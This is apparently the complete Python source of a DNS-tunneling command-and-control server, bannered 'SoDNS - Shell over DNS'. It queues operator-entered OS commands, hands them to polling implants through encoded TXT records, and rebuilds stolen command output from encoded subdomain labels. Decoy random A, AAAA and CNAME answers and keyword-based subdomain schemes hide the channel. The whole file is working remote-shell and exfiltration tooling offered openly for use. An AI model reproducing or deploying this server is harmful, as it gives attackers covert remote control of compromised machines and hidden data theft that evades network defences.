import socket
import threading
import base64
import binascii
import sys
import queue
import re
import shlex
import argparse
import time
import string
import random
from dnslib import DNSRecord, DNSHeader, DNSQuestion, RR, QTYPE, A, AAAA , MX, CNAME, TXT, NS, SOA, PTR

client_response_list = []
lock = threading.Lock()
list_start = ["api","web", "test", "part", "health", "status"]
list_end = ["brave", "search", "bind", "info"]
list_mode = ["gateway","developer", "security", "public", "www", "dev"]
domain_name = ""

class DNSServer:
    def __init__(self, host='0.0.0.0', port=53, encode_type="base64"):
        self.host = host
        self.port = port
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        self.sock.bind((self.host, self.port))
        self.command_queue = queue.Queue()
        self.command_history = {} 
        self.encode_type = encode_type
        self.domain_name=domain_name

    def handle_request(self, data, addr):
        try:
            request = DNSRecord.parse(data)
            #print(f"Gelen istek: {addr[0]}:{addr[1]}")

            reply = DNSRecord(DNSHeader(id=request.header.id, qr=1, aa=1, ra=1), q=request.q)

            for q in request.questions:
                qname = str(q.qname)
                qtype = q.qtype
                if qtype == QTYPE.A:
                   self.handle_aandcname_query(reply, q, qname,addr, QTYPE.A, self.encode_type)
                elif qtype == QTYPE.CNAME:
                    self.handle_aandcname_query(reply,q, qname,addr, QTYPE.CNAME, self.encode_type)
                elif qtype == QTYPE.TXT:
                    self.handle_txt_query(reply, q, qname,addr, QTYPE.TXT, self.encode_type)
                elif qtype == QTYPE.NS:
                    self.handle_ns_query(reply,q)
                elif qtype == QTYPE.AAAA:  # IPv6 sorgusu
                    self.handle_aandcname_query(reply,q, qname,addr, QTYPE.AAAA, self.encode_type)
                else:
                    pass
                
                """   
                 elif qtype == QTYPE.MX:
                    self.handle_mx_query(reply, q)
                 elif qtype == QTYPE.SOA:
                    self.handle_soa_query(reply,q)
                 elif qtype == QTYPE.PTR:
                    self.handle_ptr_query(reply,q)
                """
            self.sock.sendto(reply.pack(), addr)
        
        except Exception as e:
            print(f"Error: {e}")

    def handle_aandcname_query(self, reply, question, qname, addr, q_type, encode_type):
         dns_answer = None
         if q_type == QTYPE.A:
            dns_answer = RR(question.qname, QTYPE.A, rdata=A(self.generate_random_ip()), ttl=0)
         elif q_type == QTYPE.CNAME:
             dns_answer = RR(question.qname, QTYPE.CNAME, rdata=CNAME(f"{self.get_random_string()}.{domain_name}"),ttl=0)
         elif q_type == QTYPE.AAAA:
            dns_answer = RR(question.qname, QTYPE.AAAA, rdata=AAAA(self.generate_random_ip(6)), ttl=0)
         elif q_type == QTYPE.TXT:
              dns_answer = RR(question.qname, QTYPE.TXT, rdata=TXT("Empty"))
         subdomain_count = qname.count('.') - 1
         if subdomain_count > 4 and self.check_matches(qname.split('.')):
            if addr not in self.command_history:
                self.command_history[addr] = []
            self.command_history[addr].append(qname.split('.')[0])
            if qname.split('.')[2] in list_start: #single data mode 1
                #print("mode 1", qname)
                #print(qname.split('.')[0])
                client_response_list.append(qname.split('.')[1])
                
            elif qname.split('.')[3] in list_mode: # double data mode 2
                #print("mode 2", qname)
                client_response_list.append(qname.split('.')[2])
                client_response_list.append(qname.split('.')[1])
                
            elif qname.split('.')[2] in list_end:
                #print("mode end")
                client_response_list.append(qname.split('.')[1])
                #print(client_response_list)
                combined_string = ''.join(client_response_list)
                result = self.base85_decoder(combined_string) if encode_type == "base85" else self.base64_decoder(combined_string)
                print("\n" + "-" *10 + "Result" + "-" *10 + "\n", result)
                client_response_list.clear()
            else:
                #print("Default")
                reply.add_answer(dns_answer)
         elif subdomain_count >= 4  and len(qname.split('.')[0]) > 0 and len(qname.split('.')[0]) < 13: #and qname.split('.')[0] is not list_start and qname.split('.')[0] is not list_end and qname.split('.')[0] is not list_mode :
            #print("mode 3/4/5")
            #print(question.qname)
            if subdomain_count == 4:
                client_response_list.append(qname.split('.')[1])
            elif subdomain_count == 5 and qname.split('.')[2] != "t1":
                client_response_list.append(qname.split('.')[1])
                client_response_list.append(qname.split('.')[2])
            elif subdomain_count == 6 and qname.split('.')[3] != "t1":
                client_response_list.append(qname.split('.')[1])
                client_response_list.append(qname.split('.')[2])
                client_response_list.append(qname.split('.')[3]) 
         else:
             #print("test")
             #print(question.qname)
             reply.add_answer(dns_answer)

    """
    def handle_mx_query(self, reply, question):
        print(f"  MX: {question.qname}")
        reply.add_answer(RR(question.qname, QTYPE.MX, rdata=MX("mx.example.com", preference=10)), ttl=0)
    """
    def generate_random_ip(self,version=4):
        if version == 4:
             return ".".join(str(random.randint(0, 255)) for _ in range(4))
        elif version == 6:
            return ":".join(f"{random.randint(0, 65535):x}" for _ in range(8))
        else:
            pass
    
    def check_matches(self,list_to_check):
        match_count = 0
        for item in list_to_check:
            if item in list_end:
                match_count += 1
            if item in list_mode:
                match_count += 1
            if item in list_start:
                match_count += 1
        return match_count == 1  

    def get_random_string(self):
        length = random.randint(1, 12)
        letters = string.ascii_lowercase
        result_str = ''.join(random.choice(letters) for i in range(length))
        return result_str

    def base85_encoder(self, data):
        base85_encoded = base64.b85encode(data.encode('utf-8'))
        hex_encoded = base85_encoded.hex()
        return hex_encoded
    
    def base85_decoder(self, data):
        decoded_base85 = bytes.fromhex(data)
        decoded_data = base64.b85decode(decoded_base85).decode('utf-8')
        return decoded_data

    def handle_txt_query(self, reply, question, qname, addr, q_type, encode_type):
        regex_pattern = r"^(?:[1-9]|[1-9][0-9]{1,2}|1000)\.t1\." + re.escape(domain_name) + r"\.$"
        match = re.match(regex_pattern, qname)
        if match:
            if not self.command_queue.empty():
                command = self.command_queue.get()
                reply.add_answer(RR(question.qname, QTYPE.TXT, rdata=TXT(command)))
                client_response_list.clear()
            else:
                client_response_list.clear()
                reply.add_answer(RR(question.qname, QTYPE.TXT, rdata=TXT(base64.b64encode("ready".encode('utf-8')).decode('utf-8'))))
            if addr in self.command_history and self.command_history[addr]:
                try:
                     combined_output = "".join(self.command_history[addr])
                     decoded_output = base64.b64decode(combined_output).decode('utf-8')
                     self.command_history[addr] = []
                except Exception as e:
                     try:
                         combined_output = "".join(self.command_history[addr])
                         decoded_output = binascii.unhexlify(combined_output).decode('utf-8')
                         self.command_history[addr] = []
                     except Exception as e:
                        self.command_history[addr] = []
        # Recieve data via TXT

        else:
            self.handle_aandcname_query(reply, question, qname, addr, q_type, encode_type)

    
    def handle_ns_query(self, reply, question):
        #print(f" NS record query received: {question.qname}")
        reply.add_answer(RR(question.qname, QTYPE.NS, rdata=NS(f"t1ns.{domain_name}")))
    """
    def handle_soa_query(self, reply,question):
        print(f" SOA kaydı sorgusu alındı: {question.qname}")
        reply.add_answer(RR(question.qname, QTYPE.SOA, rdata=SOA(mname="ns1.example.com", rname="admin.example.com", serial=20240318, refresh=3600, retry=1800, expire=604800, minimum=3600)))

    def handle_ptr_query(self, reply, question):
        # PTR kaydı için özel cevap
        print(f"  PTR kaydı sorgusu alındı: {question.qname}")
        reply.add_answer(RR(question.qname, QTYPE.PTR, rdata=PTR("example.com")))
    """
    def add_command(self,response, command_encode_type = "base64"):
         if command_encode_type == "base64":
            encoded_response = base64.b64encode(response.encode('utf-8')).decode('utf-8')
         elif command_encode_type == "hex":
             encoded_response = binascii.hexlify(response.encode('utf-8')).decode('utf-8')
         else:
            encoded_response = response # Do not encode
         self.command_queue.put(encoded_response)
         print(f"New command added: {response} ,encode: {command_encode_type} => {encoded_response}")

    def command_handler(self):
        while True:
            with lock:
                command_line = input("Enter command (add '<OS Command>' <encode_type>): ").strip()
                if not command_line:
                    continue

                try:
                    # shlex ile komutu ayrıştır
                    parts = shlex.split(command_line)
                except ValueError as e:
                    print(f"Error occurred while parsing the command: {e}")
                    continue

                if len(parts) < 2:
                    print("Incorrect command format. Usage: add '<OS Command>' <encode_type>")
                    continue

                command = parts[0].lower()

                if command == "add":
                    if len(parts) < 2:
                        print("Incorrect command format. You did not specify the 'Command' part.")
                        continue

                    response = parts[1] 
                    encode_type = parts[2] if len(parts) > 2 else "base64"  # Opsiyonel encode_type

                    try:
                        self.add_command(response, encode_type)
                        print(f"Command added: Command='{response}', encode_type='{encode_type}'")
                    except Exception as e:
                        print(f"Error adding command: {e}")
                else:
                    print("Invalid command. Please enter 'add'.")

    def base64_decoder(self,encoded_stri:str):
        encoded_str = encoded_stri.replace("-", "+").replace("_", "/")
        try:
            padding = '=' * (4 - len(encoded_str) % 4)
            encoded_str += padding
            decoded_str = base64.b64decode(encoded_str).decode('utf-8')
        except (binascii.Error, UnicodeDecodeError) as e:
            print(f"Invalid base64 encoding for {encoded_str}: {e}")
            decoded_str = None
        return decoded_str

    def serve_forever(self):
        print(f"DNS server started at {self.host}:{self.port}.")
        command_thread = threading.Thread(target=self.command_handler, daemon=True)
        command_thread.start()
        
        while True:
            data, addr = self.sock.recvfrom(1024)
            thread = threading.Thread(target=self.handle_request, args=(data, addr))
            thread.start()

def print_banner():
    banner = """"
   _____       ____  _   _______             _____ __         ____                           ____  _   _______
  / ___/____  / __ \/ | / / ___/            / ___// /_  ___  / / /  ____ _   _____  _____   / __ \/ | / / ___/
  \__ \/ __ \/ / / /  |/ /\__ \   ______    \__ \/ __ \/ _ \/ / /  / __ | | / / _ \/ ___/  / / / /  |/ /\__ \ 
 ___/ / /_/ / /_/ / /|  /___/ /  /_____/   ___/ / / / /  __/ / /  / /_/ | |/ /  __/ /     / /_/ / /|  /___/ / 
/____/\____/_____/_/ |_//____/            /____/_/ /_/\___/_/_/   \____/|___/\___/_/     /_____/_/ |_//____/  
                                                                                                              
    """
    print(banner)


if __name__ == "__main__":
    print_banner()
    parser = argparse.ArgumentParser(description="DNS Server Usage:")
    parser.add_argument("--encode_type", "-e", type=str, choices=["base64", "base85"],  default="base64",
                        help="Optional encode type for DNS data processing")
    parser.add_argument('-d', '--domain', required=True, help="Domain name.")

    args = parser.parse_args()
    domain_name=args.domain
    dns_server = DNSServer(encode_type=args.encode_type)
    dns_server.serve_forever()
